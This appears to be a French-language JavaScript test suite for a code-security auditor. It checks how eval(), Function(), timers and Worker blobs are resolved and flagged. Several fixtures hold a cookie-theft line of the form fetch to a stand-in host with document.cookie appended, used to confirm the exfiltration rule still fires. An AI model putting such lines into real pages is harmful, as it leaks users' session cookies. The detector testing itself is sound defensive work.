import { test } from 'node:test';
import assert from 'node:assert/strict';
import { preparerCodeExecuteEnChaine, analyserSortiesReseau } from '../src/regles/c-securite.js';

/**
 * Résolution d'un identifiant passé à eval()/Function() ou à un minuteur
 * (décision de la coordination le 2026-09-28) : n'est résolu que ce dont le
 * langage garantit la valeur au moment de l'appel. Chaque garde a sa paire :
 * un test de sécurité (la forme cachée n'est pas résolue vers la valeur
 * inoffensive) et un test de faux positif (la forme honnête voisine reste
 * résolue), chacun vérifié en réintroduisant le défaut dans le code.
 */

function fichier(chemin, contenu) {
  return { chemin, contenu, lignes: contenu.split('\n'), ext: chemin.slice(chemin.lastIndexOf('.')), binaire: false, executee: true, vendorise: false, taille: Buffer.byteLength(contenu, 'utf8') };
}

function constats(contenu, regle) {
  return preparerCodeExecuteEnChaine({ fichiers: [fichier('app.js', contenu)] }).filter((c) => c.regle === regle);
}

/** Verdict de l'eval() : `mineur` si son argument est résolu vers un littéral audité, `critique+B` sinon. */
function verdictEval(contenu) {
  const c = constats(contenu, 'C-XSS-03');
  assert.equal(c.length, 1, `un seul constat eval attendu, obtenu ${c.length}`);
  return `${c[0].severite}${c[0].bloquant ? '+B' : ''}`;
}

/** Verdict du minuteur : `rien` si son argument est une fonction garantie, sinon la sévérité du constat. */
function verdictMinuteur(contenu) {
  const c = constats(contenu, 'C-XSS-04');
  if (!c.length) return 'rien';
  assert.equal(c.length, 1, `un seul constat de minuteur attendu, obtenu ${c.length}`);
  return `${c[0].severite}${c[0].bloquant ? '+B' : ''}`;
}

// eval()/Function() : seul un const est résolu --------------------------------

test('eval : un let jamais réaffecté n\'est plus résolu (seul un const est garanti par le langage)', () => {
  assert.equal(verdictEval('let code = "1+1"; eval(code);'), 'critique+B');
});

test('eval (faux positif) : un const est résolu vers son littéral, audité en mineur', () => {
  assert.equal(verdictEval('const code = "1+1"; eval(code);'), 'mineur');
});

test('eval : un let homonyme réaffecté dans une autre fonction ne désarme plus un const (plus de recherche par nom dans tout le fichier)', () => {
  assert.equal(verdictEval('const code = "1+1"; function g(x) { let code = x; code = 2; } eval(code);'), 'mineur');
});

test('eval : un nom réutilisé par du code minifié dans une autre portée ne désarme pas un const', () => {
  assert.equal(verdictEval('const e = "1+1"; function a(e) { e = 5; } eval(e);'), 'mineur');
});

test('eval (faux positif) : un const exporté est vu comme une déclaration, pas ignoré', () => {
  assert.equal(verdictEval('export const code = "1+1"; eval(code);'), 'mineur');
});

test('eval : un let exporté reste un let, jamais résolu', () => {
  assert.equal(verdictEval('export let code = "1+1"; eval(code);'), 'critique+B');
});

// Variables de boucle -----------------------------------------------------------

test('eval : une variable de for…of homonyme masque un const extérieur', () => {
  assert.equal(verdictEval('const code = "1+1"; for (const code of [obtenir()]) eval(code);'), 'critique+B');
});

test('eval : la déclaration d\'un for classique (dans init, pas left) masque un const extérieur', () => {
  assert.equal(verdictEval('const code = "1+1"; for (let code = obtenir(); ;) { eval(code); break; }'), 'critique+B');
});

test('eval (faux positif) : une boucle dont la variable porte un autre nom ne masque rien', () => {
  assert.equal(verdictEval('const code = "1+1"; for (let i = 0; i < 1; i++) eval(code);'), 'mineur');
});

// Déclaration déstructurée -----------------------------------------------------

test('eval : un const déstructuré homonyme masque un const extérieur', () => {
  assert.equal(verdictEval('const code = "1+1"; function f(r) { const { Formule: code } = r; eval(code); }'), 'critique+B');
});

test('eval (faux positif) : une déstructuration qui lie d\'autres noms ne masque rien', () => {
  assert.equal(verdictEval('const code = "1+1"; function f(r) { const { Formule } = r; eval(code); }'), 'mineur');
});

// var remontée d'un bloc imbriqué -----------------------------------------------

test('eval : une var déclarée dans un bloc imbriqué appartient à toute la fonction et masque un const extérieur', () => {
  assert.equal(verdictEval('const code = "1+1"; function f() { if (x) { var code = obtenir(); } eval(code); }'), 'critique+B');
});

test('eval (faux positif) : une var d\'une fonction imbriquée reste dans cette fonction', () => {
  assert.equal(verdictEval('const code = "1+1"; function f() { function g() { var code = 2; } eval(code); }'), 'mineur');
});

// with, switch, bloc static ---------------------------------------------------------

test('eval : dans un with, un nom peut désigner une propriété de son objet — jamais résolu', () => {
  assert.equal(verdictEval('const Formule = "1+1"; function f(r) { with (r) { eval(Formule); } }'), 'critique+B');
});

test('eval (faux positif) : un with qui n\'entoure pas l\'appel ne change rien', () => {
  assert.equal(verdictEval('const code = "1+1"; function f(r) { with (r) {} eval(code); }'), 'mineur');
});

test('eval : un const déclaré dans un case masque un const extérieur (le switch est une portée)', () => {
  assert.equal(verdictEval('const code = "1+1"; switch (x) { case 1: const code = obtenir(); eval(code); }'), 'critique+B');
});

test('eval (faux positif) : un switch qui ne déclare rien ne masque rien', () => {
  assert.equal(verdictEval('const code = "1+1"; switch (x) { case 1: eval(code); }'), 'mineur');
});

test('eval : un const d\'un bloc static masque un const extérieur', () => {
  assert.equal(verdictEval('const code = "1+1"; class A { static { const code = obtenir(); eval(code); } }'), 'critique+B');
});

test('eval (faux positif) : un const déclaré dans un bloc static y est résolu', () => {
  assert.equal(verdictEval('class A { static { const code = "1+1"; eval(code); } }'), 'mineur');
});

// Minuteur : fonction déclarée --------------------------------------------------

test('minuteur : une fonction locale réaffectée n\'est plus garantie', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} tick = obtenir(); setTimeout(tick, 0); })();'), 'info');
});

test('minuteur (faux positif) : une réaffectation d\'un homonyme dans une autre fonction ne compte pas', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} function g() { let tick = 1; tick = 2; } setTimeout(tick, 0); })();'), 'rien');
});

test('minuteur : `tick++` est une écriture', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} tick++; setTimeout(tick, 0); })();'), 'info');
});

test('minuteur (faux positif) : `n++` sur une autre variable n\'est pas une écriture de tick', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} let n = 0; n++; setTimeout(tick, 0); })();'), 'rien');
});

test('minuteur : une affectation déstructurée est une écriture', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} [tick] = [obtenir()]; setTimeout(tick, 0); })();'), 'info');
});

test('minuteur (faux positif) : une affectation déstructurée d\'autres noms ne compte pas', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} let a, b; [a, b] = [1, 2]; setTimeout(tick, 0); })();'), 'rien');
});

test('minuteur : un for…of sans déclaration réécrit sa variable', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} for (tick of [obtenir()]) {} setTimeout(tick, 0); })();'), 'info');
});

test('minuteur (faux positif) : un for…of qui déclare une autre variable ne compte pas', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} for (const x of [1]) {} setTimeout(tick, 0); })();'), 'rien');
});

test('minuteur : une var homonyme initialisée dans un bloc imbriqué réécrit la fonction', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} if (1) { var tick = obtenir(); } setTimeout(tick, 0); })();'), 'info');
});

test('minuteur (faux positif) : une var homonyme d\'une fonction imbriquée reste dans cette fonction', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} function g() { var tick = 1; } setTimeout(tick, 0); })();'), 'rien');
});

test('minuteur : un eval() direct dans la portée peut réécrire la fonction', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} eval("tick = obtenir()"); setTimeout(tick, 0); })();'), 'info');
});

test('minuteur (faux positif) : un eval() dans une fonction qui masque le nom ne l\'atteint pas', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} function g(tick) { eval("1"); } setTimeout(tick, 0); })();'), 'rien');
});

test('minuteur : une fonction déclarée avant une var homonyme initialisée n\'est pas résolue vers la fonction', () => {
  assert.equal(verdictMinuteur('(function () { function cb() {} var cb = obtenir(); setTimeout(cb, 0); })();'), 'info');
});

test('minuteur : une fonction globale n\'est jamais garantie (`window[k] = …` la remplace sans écrire son nom)', () => {
  assert.equal(verdictMinuteur('function tick() {} window["ti" + "ck"] = obtenir(); setTimeout(tick, 0);'), 'info');
});

test('minuteur (faux positif) : une fonction déclarée dans une fonction est garantie', () => {
  assert.equal(verdictMinuteur('(function () { function tick() {} setTimeout(tick, 0); })();'), 'rien');
});

test('minuteur : le nom d\'une expression de fonction peut être masqué par un eval() de son corps', () => {
  assert.equal(verdictMinuteur('setTimeout(function boucle() { eval("var boucle = obtenir()"); setTimeout(boucle, 100); }, 100);'), 'info');
});

test('minuteur (faux positif) : le nom d\'une expression de fonction est garanti (relance d\'un minuteur par lui-même)', () => {
  assert.equal(verdictMinuteur('setTimeout(function boucle() { setTimeout(boucle, 100); }, 100);'), 'rien');
});

// Minuteur : exécuteur de Promise ---------------------------------------------

test('minuteur (faux positif) : whackacell — des `r++` de boucles `for (let r …)` hors de l\'exécuteur ne touchent pas son `r`', () => {
  const contenu = [
    'async function jouer() {',
    '  for (let r = 0; r < 3; r++) {}',
    '  await new Promise(r => setTimeout(r, 10));',
    '  for (let r = 0; r < 3; r++) {}',
    '}',
  ].join('\n');
  assert.equal(verdictMinuteur(contenu), 'rien');
});

test('minuteur (faux positif) : une boucle `for (let r …)` DANS l\'exécuteur lie un autre `r`', () => {
  assert.equal(verdictMinuteur('new Promise(r => { for (let r = 0; r < 3; r++) {} setTimeout(r, 10); });'), 'rien');
});

test('minuteur (faux positif) : un paramètre homonyme d\'un callback imbriqué lie un autre `r`', () => {
  assert.equal(verdictMinuteur('new Promise(r => { [1, 2].forEach(r => { r = 3; }); setTimeout(r, 10); });'), 'rien');
});

test('minuteur (faux positif) : un catch homonyme lie un autre `r`', () => {
  assert.equal(verdictMinuteur('new Promise(r => { try {} catch (r) { r = 1; } setTimeout(r, 10); });'), 'rien');
});

test('minuteur : `resolve` réécrit par une affectation déstructurée n\'est plus garanti', () => {
  assert.equal(verdictMinuteur('new Promise(resolve => { [resolve] = [obtenir()]; setTimeout(resolve, 0); });'), 'info');
});

test('minuteur : `arguments[0] = …` réécrit le `resolve` d\'un exécuteur `function`', () => {
  assert.equal(verdictMinuteur('new Promise(function (resolve) { arguments[0] = obtenir(); setTimeout(resolve, 0); });'), 'info');
});

test('minuteur (faux positif) : `arguments` d\'une fonction imbriquée dans un exécuteur fléché ne touche pas `resolve`', () => {
  assert.equal(verdictMinuteur('new Promise(resolve => { function g() { return arguments.length; } setTimeout(resolve, 0); });'), 'rien');
});

test('minuteur : la valeur par défaut d\'un troisième paramètre peut réécrire `resolve`', () => {
  assert.equal(verdictMinuteur('new Promise(function (resolve, reject, x = (resolve = obtenir())) { setTimeout(resolve, 0); });'), 'info');
});

test('minuteur (faux positif) : une valeur par défaut qui n\'écrit rien ne compte pas', () => {
  assert.equal(verdictMinuteur('new Promise(function (resolve, reject, x = 1) { setTimeout(resolve, 0); });'), 'rien');
});

// Minuteur : liaison non garantie qui reçoit une chaîne ou une donnée -----------

test('minuteur : un let initialisé par une chaîne exécute un contenu que l\'analyse ne peut pas garantir (sinon cacher la chaîne dans un let échappait à l\'audit)', () => {
  assert.equal(verdictMinuteur('let code = "fetch(\'https://x.example/\' + document.cookie)"; setTimeout(code, 0);'), 'critique+B');
});

test('minuteur : le contenu d\'une chaîne écrite dans un let reste audité comme du code (la fuite qu\'il contient ressort)', () => {
  const ctx = { fichiers: [fichier('app.js', 'let code = "fetch(\'https://collecte.example/\' + document.cookie)";\nsetTimeout(code, 0);')] };
  preparerCodeExecuteEnChaine(ctx);
  const fuite = analyserSortiesReseau(ctx).find((c) => c.regle === 'C-EXFIL-02');
  assert.ok(fuite, 'sans quoi cacher la chaîne dans un let faisait disparaître la fuite du rapport');
  assert.match(fuite.fichier, /app\.js \(code littéral, ligne 1, colonne 12\)/);
});

/** Fichiers synthétiques créés et constats C-EXFIL-02 trouvés dedans, pour un fichier `app.js`. */
function contenusAudites(contenu) {
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  preparerCodeExecuteEnChaine(ctx);
  return {
    synthetiques: ctx.fichiers.filter((f) => f.litteralImbrique).map((f) => f.chemin),
    fuites: analyserSortiesReseau(ctx).filter((c) => c.regle === 'C-EXFIL-02').map((c) => c.fichier),
  };
}

const FUITE = 'fetch(\'https://collecte.example/\' + document.cookie)';

test('eval : le contenu d\'une chaîne écrite dans un let reste audité, même si la valeur exécutée n\'est pas garantie', () => {
  const { synthetiques, fuites } = contenusAudites(`let code = "${FUITE}";\neval(code);`);
  assert.equal(verdictEval(`let code = "${FUITE}";\neval(code);`), 'critique+B');
  assert.deepEqual(synthetiques, ['app.js (code littéral, ligne 1, colonne 12)']);
  assert.equal(fuites.length, 1, 'sans quoi cacher la chaîne dans un let faisait disparaître la fuite du rapport');
});

test('Function : une chaîne écrite dans un let est auditée comme un corps de fonction (où `return` est valide)', () => {
  const { fuites } = contenusAudites(`let code = "${FUITE}; return 1";\nnew Function(code)();`);
  assert.equal(fuites.length, 1);
});

test('minuteurs : une chaîne lue par deux appels n\'est matérialisée qu\'une fois (un seul fichier à son emplacement)', () => {
  const { synthetiques, fuites } = contenusAudites(`let code = "${FUITE}";\nsetTimeout(code, 0);\nsetTimeout(code, 10);`);
  assert.deepEqual(synthetiques, ['app.js (code littéral, ligne 1, colonne 12)']);
  assert.equal(fuites.length, 1);
});

test('eval puis Function : un texte que seul Function peut lire est encore audité après l\'échec d\'eval', () => {
  const { synthetiques, fuites } = contenusAudites(`let code = "${FUITE}; return 1";\neval(code);\nnew Function(code)();`);
  assert.equal(synthetiques.length, 1);
  assert.equal(fuites.length, 1);
});

test('minuteur (faux positif) : deux chaînes distinctes écrites dans le même let sont chacune auditée', () => {
  const { synthetiques, fuites } = contenusAudites('let code = "fetch(\'https://un.example/\' + document.cookie)";\ncode = "fetch(\'https://deux.example/\' + document.cookie)";\nsetTimeout(code, 0);');
  assert.deepEqual(synthetiques, ['app.js (code littéral, ligne 1, colonne 12)', 'app.js (code littéral, ligne 2, colonne 8)']);
  assert.equal(fuites.length, 2);
});

test('minuteur : un let qui reçoit une chaîne par affectation, pareil', () => {
  assert.equal(verdictMinuteur('let code; code = "void 0"; setTimeout(code, 0);'), 'critique+B');
});

test('minuteur : un const initialisé par une donnée d\'enregistrement Grist est traité comme cette donnée', () => {
  assert.equal(verdictMinuteur('grist.onRecord(r => { const code = r.Formule; setTimeout(code, 0); });'), 'critique+B');
});

test('minuteur (faux positif) : un let qui ne reçoit qu\'une fonction reste une simple information', () => {
  assert.equal(verdictMinuteur('let cb = () => {}; setTimeout(cb, 0);'), 'info');
});

test('minuteur (faux positif) : un const littéral est audité comme le littéral écrit en place', () => {
  assert.equal(verdictMinuteur('const code = "void 0"; setTimeout(code, 0);'), 'mineur');
});

// Littéraux décodables et valeurs qui ne sont jamais du texte --------------------

const VOID_0 = '118,111,105,100,32,48'; // String.fromCharCode(…) === "void 0"

test('minuteur : String.fromCharCode derrière un alias global (`window.String…`) est décodé et audité, pas laissé en simple information', () => {
  assert.equal(verdictMinuteur(`setTimeout(window.String.fromCharCode(${VOID_0}), 0);`), 'mineur');
});

test('minuteur : String.fromCharCode d\'une valeur non littérale reste une chaîne que l\'analyse ne peut pas garantir', () => {
  assert.equal(verdictMinuteur('setTimeout(window.String.fromCharCode(x), 0);'), 'critique+B');
});

test('eval : String.fromCharCode de codes littéraux est décodé et audité comme un littéral', () => {
  assert.equal(verdictEval(`eval(String.fromCharCode(${VOID_0}));`), 'mineur');
});

test('minuteur : `setTimeout(null, 1)` a une valeur entièrement connue — audité comme un littéral, jamais un faux bloquant', () => {
  assert.equal(verdictMinuteur('setTimeout(null, 1);'), 'mineur');
});

test('minuteur : `setTimeout(a - b, 0)` ne produit jamais de texte — aucun constat', () => {
  assert.equal(verdictMinuteur('setTimeout(a - b, 0);'), 'rien');
});

test('minuteur : `setTimeout(a + b, 0)` peut produire du texte — chaîne que l\'analyse ne peut pas garantir', () => {
  assert.equal(verdictMinuteur('setTimeout(a + b, 0);'), 'critique+B');
});

test('Worker : un élément de Blob encodé en base64 est décodé et audité, comme le même contenu passé à eval()', () => {
  const b64 = Buffer.from('postMessage(1)').toString('base64');
  const c = constats(`new Worker(URL.createObjectURL(new Blob([atob("${b64}")])));`, 'C-XSS-07');
  assert.deepEqual(c.map((x) => `${x.severite}${x.bloquant ? '+B' : ''}`), ['mineur']);
});

test('Worker : un élément de Blob non littéral reste un contenu que l\'analyse ne peut pas garantir', () => {
  const c = constats('new Worker(URL.createObjectURL(new Blob([atob(x)])));', 'C-XSS-07');
  assert.deepEqual(c.map((x) => `${x.severite}${x.bloquant ? '+B' : ''}`), ['critique+B']);
});
